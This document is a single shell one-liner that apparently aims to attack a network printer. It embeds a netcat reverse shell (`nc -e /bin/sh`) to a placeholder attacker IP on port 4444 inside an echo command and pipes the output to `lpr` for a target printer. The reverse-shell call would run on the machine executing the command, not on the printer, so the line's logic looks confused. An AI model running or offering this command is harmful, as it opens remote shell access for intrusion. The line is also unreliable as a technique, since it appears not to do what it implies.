echo -e "\033[31m$(nc -e /bin/sh [Attacker-IP] 4444)\033[0m" | lpr -S [Target-IP] -P [Printer-Name]
